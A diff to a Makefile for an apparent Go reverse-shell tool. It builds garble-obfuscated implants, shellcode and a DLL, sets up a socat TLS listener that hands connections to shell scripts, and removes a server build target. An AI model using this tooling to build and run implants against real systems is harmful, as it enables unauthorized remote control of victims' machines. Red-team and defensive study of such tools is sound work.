@@ -39,7 +39,7 @@ SOCAT = /usr/bin/socat
 # ZSTD.linux = -tags zstd
 
 .PHONY: all
-all: $(PLATFORMS) server shellcode dll
+all: $(PLATFORMS) shellcode dll
 
 .PHONY: $(PLATFORMS)
 ${PLATFORMS}: $(SRV_KEY) $(GARBLE)
@@ -51,20 +51,14 @@ ${PLATFORMS}: $(SRV_KEY) $(GARBLE)
 		-o ${OUT}/${APP}.${target} \
 		cmd/gorsh/main.go
 
-.PHONY: listen listen-socat
+.PHONY: listen
 listen: $(SRV_KEY) $(SOCAT)
 	@test -n "$(PORT)" || (echo "PORT not defined"; exit 1)
 	${SOCAT} -d \
 		OPENSSL-LISTEN:${PORT},fork,key=${SRV_KEY},cert=${SRV_PEM},reuseaddr,verify=0 \
 		EXEC:scripts/${target}.sh
 
-.PHONY: server
-server:
-	GOOS=linux ${BUILD} \
-		-buildmode pie \
-		-ldflags ${LDFLAGS} \
-		-o ${OUT}/srv/gorsh-server \
-		cmd/gorsh-server/main.go
+		# EXEC:scripts/${target}.sh
 
 .PHONY: shellcode
 shellcode: $(GODONUT) windows
